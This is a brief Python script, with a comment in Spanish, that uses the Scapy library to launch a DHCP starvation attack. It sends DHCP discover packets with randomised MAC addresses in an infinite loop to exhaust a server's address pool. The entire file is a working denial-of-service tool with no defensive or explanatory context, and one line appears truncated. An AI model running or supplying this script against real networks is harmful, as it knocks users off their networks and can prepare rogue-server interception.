#! /usr/bin/env python
import sys
from scapy.all import *

#Saturamos el servidor DHCP con miles de peticiones
conf.checkIPaddr = False
dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123$
sendp(dhcp_discover,loop=1)
